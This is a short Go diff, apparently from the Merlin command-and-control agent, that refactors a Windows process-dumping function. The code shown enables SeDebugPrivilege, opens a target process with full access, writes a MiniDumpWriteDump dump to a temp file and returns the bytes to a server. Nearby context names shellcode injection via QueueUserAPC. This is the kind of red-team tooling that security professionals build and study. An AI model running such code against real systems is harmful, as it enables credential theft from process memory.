@@ -34,9 +34,6 @@ import (
 
 	// 3rd Party
 	"github.com/mattn/go-shellwords"
-
-	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg/modules"
 )
 
 const (
@@ -381,46 +378,47 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 // miniDump will attempt to perform use the Windows MiniDumpWriteDump API operation on the provided process, and returns
 // the raw bytes of the dumpfile back as an upload to the server.
 // Touches disk during the dump process, in the OS default temporary or provided temporary directory
-func miniDump(tempDir string, process string, inPid uint32) (modules.MinidumpFile, error) {
-	ret := modules.MinidumpFile{} // []byte{}
+func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
+	var mini map[string]interface{}
+	mini = make(map[string]interface{})
 	var err error
 
 	// Make sure temporary directory exists before executing miniDump functionality
 	if tempDir != "" {
 		d, errS := os.Stat(tempDir)
 		if os.IsNotExist(errS) {
-			return ret, fmt.Errorf("the provided directory does not exist: %s", tempDir)
+			return mini, fmt.Errorf("the provided directory does not exist: %s", tempDir)
 		}
 		if d.IsDir() != true {
-			return ret, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
+			return mini, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
 		}
 	} else {
 		tempDir = os.TempDir()
 	}
 
 	// Get the process PID or name
-	ret.ProcName, ret.ProcID, err = getProcess(process, inPid)
+	mini["ProcName"], mini["ProcID"], err = getProcess(process, inPid)
 	if err != nil {
-		return ret, err
+		return mini, err
 	}
 
 	// Get debug privs (required for dumping processes not owned by current user)
 	err = sePrivEnable("SeDebugPrivilege")
 	if err != nil {
-		return ret, err
+		return mini, err
 	}
 
 	// Get a handle to process
-	hProc, err := syscall.OpenProcess(0x1F0FFF, false, ret.ProcID) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
+	hProc, err := syscall.OpenProcess(0x1F0FFF, false, mini["ProcID"].(uint32)) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
 	if err != nil {
-		return ret, err
+		return mini, err
 	}
 
 	// Set up the temporary file to write to, automatically remove it once done
 	// TODO: Work out how to do this in memory
 	f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
 	if tempErr != nil {
-		return ret, tempErr
+		return mini, tempErr
 	}
 
 	// Remove the file after the function exits, regardless of error nor not
@@ -442,18 +440,18 @@ func miniDump(tempDir string, process string, inPid uint32) (modules.MinidumpFil
 		);
 	*/
 	// Call Windows MiniDumpWriteDump API
-	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(ret.ProcID), f.Fd(), 3, 0, 0, 0)
+	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(mini["ProcID"].(uint32)), f.Fd(), 3, 0, 0, 0)
 
 	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does
 
 	if r != 0 {
-		ret.FileContent, err = ioutil.ReadFile(f.Name())
+		mini["FileContent"], err = ioutil.ReadFile(f.Name())
 		if err != nil {
 			f.Close()
-			return ret, err
+			return mini, err
 		}
 	}
-	return ret, nil
+	return mini, nil
 }
 
 // getProcess takes in a process name OR a process ID and returns a pointer to the process handle, the process name,
